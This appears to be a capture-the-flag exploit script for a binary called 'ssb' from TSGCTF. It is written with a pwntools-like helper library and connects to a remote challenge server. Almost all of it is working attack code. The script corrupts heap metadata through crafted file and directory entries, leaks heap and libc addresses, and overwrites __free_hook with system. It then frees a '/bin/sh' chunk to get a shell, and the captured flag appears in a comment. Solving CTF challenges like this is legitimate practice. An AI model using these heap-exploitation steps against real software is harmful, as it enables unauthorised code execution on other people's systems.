#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './ssb'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'34.85.75.40', 'port':31000})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    ssb = SSB(conn)

    for i in range(0x10):
        if i > 0:
            ssb.add_dir('%02x_dir' % (i*0x10))
            ssb.change_dir('%02x_dir' % (i*0x10))
        for j in range(1, 0x10):
            ssb.add_file('%02x_file' % (i*0x10+j), 1, 'x'*0x8+(p64(0x71) if i*0x10+j==0xff else ''))
        if i > 0:
            ssb.change_dir('..')

    ssb.remove('02_file')
    ssb.add_file('B'*7, 0x60-9, 'b'*8)
    ssb.remove('01_file')
    ssb.add_file('A'*7, 1, 'a'*0x50+'\x01'+'FAKEDIR')
    ssb.remove('03_file')
    ssb.add_file('C'*7, 0x420-9, 'c'*8)
    ssb.remove('04_file')
    ssb.add_file('D'*7, 0x60-9, 'd'*8)

    ssb.change_dir('FAKEDIR')

    addr_heap = 0
    for x in map(lambda x : int(x.split('_')[0], 16), ssb.list()[1:][::-1]):
        addr_heap <<= 8
        addr_heap += x
    addr_heap_base = addr_heap - 0x8280
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    ssb.remove('80_dir')
    ssb.change_dir('..')
    ssb.remove('20_dir')
    ssb.change_dir('FAKEDIR')
    ssb.add_dir('20_dir')

    ssb.change_dir('..')
    ssb.remove('A'*7)
    ssb.add_file('A'*7, 1, ('a'*0x38+p64(0x61)).ljust(0x50, '\x00')+'\x02'+'FAKEFILE')
    ssb.remove('FAKEFILE')

    ssb.add_file('02_file', 1, 'X'*8)
    ssb.add_dir('80_dir')

    ssb.change_dir('f0_dir')
    ssb.remove('ff_file')
    ssb.add_file('ff_file', 1, p64(0)+p64(0x61)+p64(addr_heap_base + 0x350))
    ssb.change_dir('..')

    ssb.remove('02_file')
    ssb.remove('C'*7)
    ssb.add_file('B'*7, 0x70-9, 'b'*8)
    ssb.add_file('C'*7, 0x70-9, 'c'*0x10+'\x02TARGET'.ljust(0x27, '\x00')+chr(1)+p64(addr_heap_base + 0x82e0))

    addr_libc_mainarena = u(ssb.show_file('TARGET')) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']

    ssb.remove('C'*7)
    ssb.remove('A'*7)
    ssb.add_file('A'*7, 1, ('a'*0x38+p64(0x61))+p64(addr_libc_free_hook))

    ssb.add_file('C'*7, 0x60-9, '/bin/sh\x00')
    ssb.add_file('B'*7, 0x60-9, p64(addr_libc_system))
    ssb.remove('C'*7)
    
class SSB:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def list(self):
        self.sendlineafter('> ', '1')
        return self.recvuntil('\n\n--', drop=True).split()

    def add_file(self, name, size, data):
        self.sendlineafter('> ', '2')
        if env.check('remote'):
            self.sendline(name)
            self.sendline(str(size))
        else:
            self.sendlineafter('name: ', name)
            self.sendlineafter('size: ', str(size))

        if size <= 0x50:
            self.sendline(data)
        else:
            self.send(data)

    def add_dir(self, name):
        self.sendlineafter('> ', '3')
        self.sendlineafter('name: ', name)

    def show_file(self, name):
        self.sendlineafter('> ', '4')
        self.sendlineafter('name: ', name)
        return self.recvuntil('\n\n', drop=True)

    def change_dir(self, name):
        self.sendlineafter('> ', '5')
        self.sendlineafter('name: ', name)

    def remove(self, name):
        self.sendlineafter('> ', '6')
        self.sendlineafter('name: ', name)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    # TSGCTF{My_f4v0r1te_f1ghter_15_Palutena!_Bakuen!}
    
#==========
